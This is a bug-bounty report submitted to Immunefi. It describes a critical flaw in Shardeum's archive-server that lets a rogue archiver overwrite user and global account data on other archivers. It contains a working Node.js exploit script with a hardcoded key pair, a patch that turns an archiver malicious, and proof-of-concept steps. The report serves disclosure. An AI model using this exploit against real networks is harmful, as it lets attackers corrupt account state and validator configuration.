# Boost \_ Shardeum\_ Ancillaries 34508 - \[Websites and Applications - Critical] Malicious archiver can

Submitted on Wed Aug 14 2024 05:58:21 GMT-0400 (Atlantic Standard Time) by @periniondon630 for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #34508

Report type: Websites and Applications

Report severity: Critical

Target: <https://github.com/shardeum/archive-server/tree/dev>

Impacts:

* Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

## Brief/Intro

A malicious archiver can connect to the network, become a valid active archiver, and overwrite any user account data across all active archivers, including global accounts.

## Vulnerability Details

It is possible to create a malicious archiver based on the archiver-server repository and connect it to the network. There are no restrictions on who can create and connect an archiver to the network. When a malicious archiver is connected, it can initiate a gossip request with a fake receipt ID to the victim archiver. Exploit code:

```javascript
import axios from 'axios';
import * as core from '@shardus/crypto-utils'
import { Utils as StringUtils } from '@shardus/types'

const TARGET_URL='http://127.0.0.1:4000'
const PRIVATE_KEY='3ea2ee94d1de9ef0e59a08af12aad53375cab0857f73fe243184c6f85edefb39e8a5c26b9e2c3c31eb7c7d73eaed9484374c16d983ce95f3ab18a62521964a94'
const PUBLIC_KEY='e8a5c26b9e2c3c31eb7c7d73eaed9484374c16d983ce95f3ab18a62521964a94'

export function sign(obj) {
  const objCopy = StringUtils.safeJsonParse(core.stringify(obj))
  core.signObj(objCopy, PRIVATE_KEY, PUBLIC_KEY)
  return objCopy
}

async function main(){
        console.log('exploiting archiver-server')
        const txid = process.argv[2]
        core.init('69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc')
        let payload = {
                'dataType': 'RECEIPT',
                'data': [{'txId': txid, 'timestamp': 1}],
        }
        payload = sign(payload)
        const r = await axios.post(TARGET_URL + '/gossip-data', payload)
        console.log('success', r.data)
}

main()
```

The victim archiver will send a request back to the malicious archiver for details about the receipt. Here is the code that sends the request back to the malicious archiver

```javascript
export const collectMissingReceipts = async (
  senders: string[],
  txId: string,
  txTimestamp: number
): Promise<void> => {
  const txIdList: [string, number][] = [[txId, txTimestamp]]
  let foundTxData = false
  const senderArchivers = State.activeArchivers.filter((archiver) => senders.includes(archiver.publicKey))
  Logger.mainLogger.debug(
    `Collecting missing receipt for txId ${txId} with timestamp ${txTimestamp} from archivers`,
    senderArchivers.map((a) => a.ip + ':' + a.port)
  )
  for (const senderArchiver of senderArchivers) {
    if (
      (processedReceiptsMap.has(txId) && processedReceiptsMap.get(txId) === txTimestamp) ||
      (receiptsInValidationMap.has(txId) && receiptsInValidationMap.get(txId) === txTimestamp)
    ) {
      foundTxData = true
      break
    }
    const receipts = (await queryTxDataFromArchivers(
      senderArchiver,
      DataType.RECEIPT,
      txIdList
    )) as Receipt.Receipt[]
    if (receipts && receipts.length > 0) {
      for (const receipt of receipts) {
        const { receiptId, timestamp } = receipt
        if (txId === receiptId && txTimestamp === timestamp) {
          storeReceiptData([receipt], senderArchiver.ip + ':' + senderArchiver.port, true)
          foundTxData = true
        }
      }
    }
    if (foundTxData) break
  }
  if (!foundTxData) {
    Logger.mainLogger.error(
      `Failed to collect receipt for txId ${txId} with timestamp ${txTimestamp} from archivers ${senders}`
    )
  }
  collectingMissingOriginalTxsMap.delete(txId)
}
```

If the receipt is valid, the victim archiver will store the receipt in a database by calling the storeReceiptData function. A malicious archiver can craft a receipt payload in a way that will overwrite existing account data. Patch file for the malicious archiver:

```
diff --git a/src/API.ts b/src/API.ts
index 5335754..795ab09 100644
--- a/src/API.ts
+++ b/src/API.ts
@@ -482,6 +482,7 @@ export function registerRoutes(server: FastifyInstance<Server, IncomingMessage,
 
   server.post('/receipt', async (_request: ReceiptRequest & Request, reply) => {
     const requestData = _request.body
+    console.log('receipt request', requestData)
     const result = validateRequestData(requestData, {
       count: 'n?',
       start: 'n?',
@@ -501,6 +502,76 @@ export function registerRoutes(server: FastifyInstance<Server, IncomingMessage,
     }
     const { count, start, end, startCycle, endCycle, type, page, txId, txIdList } = _request.body
     let receipts: (ReceiptDB.Receipt | ReceiptDB.ReceiptCount)[] | number = []
+    if (txIdList && txIdList.length == 1 && txIdList[0][0].startsWith('hacker')) {
+        const receipt = [{
+    receiptId: txIdList[0][0],
+    timestamp: 1,
+    tx: {
+        txId: txIdList[0][0],
+        timestamp: 1,
+        originalTxData: {}
+    },
+    cycle: 1,
+    beforeStateAccounts: [],
+    accounts: [{
+        accountId: "",
+        cycleNumber: 1,
+        data: {
+            timestamp: 2000000000000,
+            hash: "hash"
+        },
+        timestamp: 2000000000000,
+        hash: "hash",
+        isGlobal: true
+    }],
+    appliedReceipt: {
+            txid: '',
+            result: true,
+            signatures: [{owner: '', sig: ''}],
+            app_data_hash: '',
+            appliedVote: {
+                    txid: '',
+                    transaction_result: true,
+                    account_id: [''],
+                    account_state_hash_after: [''],
+                    account_state_hash_before: [''],
+                    cant_apply: true,
+                    node_id: '',
+                    sign: {owner: '', sig: ''},
+                    app_data_hash: ''
+            },
+            confirmOrChallenge: {
+                    appliedVote: {
+                            txid: '',
+                            transaction_result: true,
+                            account_id: [''],
+                            account_state_hash_after: [''],
+                            account_state_hash_before: [''],
+                            cant_apply: true,
+                            node_id: '',
+                            sign: {owner: '', sig: ''},
+                            app_data_hash: ''
+                    },
+                    message: '',
+                    nodeId: '',
+                    sign: {owner: '', sig: ''}
+            }
+    },
+    appReceiptData: {
+        data: {
+            amountSpent: "100",
+            readableReceipt: { status: 1 }
+        }
+    },
+    executionShardKey: "",
+    globalModification: true
+}]
+        console.log('sending hackers receipts', receipt)
+        const res = Crypto.sign({
+      receipts: [receipt]
+        })
+        reply.send(res)
+    } else {
     if (count) {
       if (count <= 0 || Number.isNaN(count)) {
         reply.send({ success: false, error: `Invalid count` })
@@ -598,7 +669,7 @@ export function registerRoutes(server: FastifyInstance<Server, IncomingMessage,
     const res = Crypto.sign({
       receipts,
     })
-    reply.send(res)
+    reply.send(res)}
   })
 
   type AccountRequest = FastifyRequest<{

```

## Impact Details

* Any user or global account data can be overwritten on all active archivers.
* The network global account is used by validators to load initial configuration, which can be controlled by an attacker.
* The global modification flag in account data allows the attacker to skip most validations and overwrite global network account data.

## Proof of concept

## Proof of Concept

1. Start the local Shardeum network.
2. Compile the malicious archiver (you need to include the local archiver-server in the shardeum-core package.json).
3. Start the malicious archiver and provide ARCHIVER\_INFO=ip:port:public\_key, so the malicious archiver can connect to the main archiver.
4. Update the URL to the main archiver, the public key, and the private key inside exploit.js, then run npm i. package.json:

```json
{
  "name": "exploit",
  "version": "1.0.0",
  "description": "",
  "type": "module",
  "dependencies": {
    "axios": "^1.7.4",
    "@shardus/crypto-utils": "4.1.3",
    "@shardus/types": "1.2.13"
  }
}
```

5. Run the exploit. It will send a gossip request to the main archiver. Please provide a unique ID as a command line parameter each time you run the exploit. For example:

```
node exploit.js 111
```

6. The main archiver will send a request to the malicious archiver.
7. The malicious archiver will respond with crafted account data that will replace the global network account, which will be used as a configuration source for all new validators started in the network.
8. On the victim archiver, go to the archiver database in server/instances/archiver-db-4000:

```
sqlite3 archiverdb-4000.sqlite3
```

9. Check that the global network account was changed:

```
select data from accounts where accountId = '1000000000000000000000000000000000000000000000000000000000000001';
```
